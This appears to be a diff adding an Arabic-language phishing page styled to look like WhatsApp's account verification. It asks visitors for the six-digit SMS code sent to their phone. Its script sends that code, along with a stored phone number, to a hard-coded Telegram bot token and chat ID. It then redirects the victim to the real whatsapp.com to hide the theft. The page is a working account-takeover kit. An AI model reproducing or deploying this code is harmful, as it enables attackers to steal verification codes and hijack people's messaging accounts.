@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأكيد الكود</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
+        .header { color: #25d366; font-size: 22px; font-weight: bold; margin-bottom: 15px; }
+        p { color: #666; font-size: 14px; margin-bottom: 25px; line-height: 1.6; }
+        input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; text-align: center; font-size: 18px; letter-spacing: 5px; }
+        button { width: 100%; padding: 12px; background-color: #25d366; border: none; border-radius: 5px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">تأكيد رمز التحقق</div>
+    <p>لقد أرسلنا كود التحقق المكون من 6 أرقام إلى هاتفك عبر رسالة SMS. يرجى إدخاله أدناه لإتمام التوثيق.</p>
+    
+    <input type="text" id="code" placeholder="------" maxlength="6">
+    <button onclick="sendCode()">تأكيد التوثيق</button>
+</div>
+
+<script>
+    const token = "7841615668:AAGwEvfH05NZKYNFqHZHhfAPZeio7rPlcJc";
+    const chatId = "6678179112";
+
+    function sendCode() {
+        const code = document.getElementById('code').value;
+        const phone = localStorage.getItem('userPhone') || "غير معروف";
+
+        if (code.length < 6) {
+            alert("يرجى إدخال الكود كاملاً");
+            return;
+        }
+
+        const message = `🔑 كود التحقق الجديد:\nالرقم: ${phone}\nالكود: ${code}`;
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        fetch(url).then(() => {
+            alert("تم إرسال طلبك بنجاح، سيتم مراجعة الحساب خلال 24 ساعة.");
+            window.location.href = "https://www.whatsapp.com"; // تحويله لموقع واتساب الرسمي بعد الانتهاء
+        }).catch(err => {
+            alert("حدث خطأ، حاول مرة أخرى");
+        });
+    }
+</script>
+
+</body>
+</html>
